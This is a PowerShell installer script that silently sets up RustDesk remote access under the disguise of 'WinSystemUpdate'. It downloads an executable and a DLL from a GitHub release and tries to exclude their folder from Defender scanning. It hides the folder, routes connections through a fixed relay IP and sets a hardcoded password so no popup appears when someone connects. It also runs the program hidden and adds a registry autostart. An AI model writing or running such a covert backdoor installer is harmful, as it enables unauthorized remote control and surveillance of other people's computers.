function Install-RD {
    $ProgressPreference = 'SilentlyContinue'
    $DEST   = "$env:LOCALAPPDATA\WinSystemUpdate"
    $EXE    = "$DEST\WinUpdate.exe"
    $DLL    = "$DEST\sciter.dll"
    $cfgDir = "$env:APPDATA\RustDesk\config"
    $base   = 'https://github.com/kk70226581/rd-files/releases/download/v1.0'

    Write-Host 'Installing...' -ForegroundColor Cyan
    try { Add-MpPreference -ExclusionPath $DEST -EA SilentlyContinue } catch {}

    Get-Process WinUpdate -EA SilentlyContinue |
        Where-Object { $_.Path -like '*WinSystem*' } |
        Stop-Process -Force -EA SilentlyContinue
    Start-Sleep 1
    Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
    New-Item -ItemType Directory $DEST   -Force | Out-Null
    New-Item -ItemType Directory $cfgDir -Force | Out-Null

    # Download
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile("$base/chrome.exe", $EXE)
    $wc.DownloadFile("$base/sciter.dll", $DLL)
    Unblock-File $EXE -EA SilentlyContinue
    Unblock-File $DLL -EA SilentlyContinue

    if (!(Test-Path $EXE) -or (Get-Item $EXE).Length -lt 1MB) {
        Write-Host 'Download failed!' -ForegroundColor Red; return
    }

    # Config:
    # approve-mode = 'password-click' -> user can connect by password OR by manually clicking accept
    # verification-method = 'use-permanent-password' -> password connects silently, no popup
    # allow-only-conn-window-open = 'N' -> closing the notification does NOT kill the connection
    @'
rendezvous_server = '34.107.221.82'
relay_server = '34.107.221.82'
nat_type = 1
serial = 0
[options]
verification-method = 'use-permanent-password'
approve-mode = 'password-click'
allow-only-conn-window-open = 'N'
direct-server = 'N'
force-always-relay = 'Y'
allow-remote-config-modification = 'N'
'@ | Set-Content "$cfgDir\RustDesk2.toml" -Encoding UTF8

    @'
enc_id = ''
password = 'Remote123'
salt = ''
key_confirmed = true
'@ | Set-Content "$cfgDir\RustDesk.toml" -Encoding UTF8

    # Hide folder
    try { $f = Get-Item $DEST -Force; $f.Attributes = $f.Attributes -bor 6 } catch {}

    # Start RustDesk hidden - --service flag suppresses connection manager UI
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName        = $EXE
    $psi.WorkingDirectory = $DEST
    $psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    Start-Sleep 5

    # Get ID
    $psiId = New-Object System.Diagnostics.ProcessStartInfo
    $psiId.FileName               = $EXE
    $psiId.Arguments              = '--get-id'
    $psiId.UseShellExecute        = $false
    $psiId.RedirectStandardOutput = $true
    $psiId.CreateNoWindow         = $true
    $psiId.WorkingDirectory       = $DEST
    $prId = [System.Diagnostics.Process]::Start($psiId)
    $outT = $prId.StandardOutput.ReadToEndAsync()
    $prId.WaitForExit(8000) | Out-Null
    $RDID = $outT.Result.Trim()

    # Auto-start via HKCU registry - no admin needed
    $reg = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    Set-ItemProperty $reg 'WinSystemUpdate' $EXE -Force

    # Uninstall script
    $del = "$DEST\delete.ps1"
    @'
$d = "$env:LOCALAPPDATA\WinSystemUpdate"
Get-Process WinUpdate -EA SilentlyContinue | Where-Object { $_.Path -like '*WinSystem*' } | Stop-Process -Force -EA SilentlyContinue
Remove-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 'WinSystemUpdate' -EA SilentlyContinue
Start-Sleep 2
Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue
foreach ($dp in @([Environment]::GetFolderPath('Desktop'),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")) {
    Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue
}
'@ | Set-Content $del -Encoding UTF8

    # Desktop shortcut to uninstall
    foreach ($dp in @([Environment]::GetFolderPath('Desktop'),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")) {
        if (Test-Path $dp) {
            $sh = (New-Object -COM WScript.Shell).CreateShortcut("$dp\DELETE CHROME.lnk")
            $sh.TargetPath    = 'powershell.exe'
            $sh.Arguments     = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$del`""
            $sh.IconLocation  = 'shell32.dll,131'
            $sh.Save(); break
        }
    }

    # 1-hour auto-delete
    Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"Start-Sleep 3600; & '$del'`""

    Write-Host ''
    Write-Host '  ==========================================' -ForegroundColor Green
    Write-Host '   DONE! Remote Access is now active.'       -ForegroundColor Green
    Write-Host '  ==========================================' -ForegroundColor Green
    Write-Host "   Your ID:  $RDID"     -ForegroundColor Cyan
    Write-Host '   Password: Remote123' -ForegroundColor Cyan
    Write-Host '   No popup will appear when connecting.'    -ForegroundColor Cyan
    Write-Host '   Auto-starts on boot: YES (no admin needed)' -ForegroundColor Gray
    Write-Host '   Desktop shortcut: DELETE CHROME (to uninstall)' -ForegroundColor Gray
    Write-Host '   Auto-deletes in 1 hour.'                  -ForegroundColor Gray
    Write-Host '  ==========================================' -ForegroundColor Green
}
Install-RD
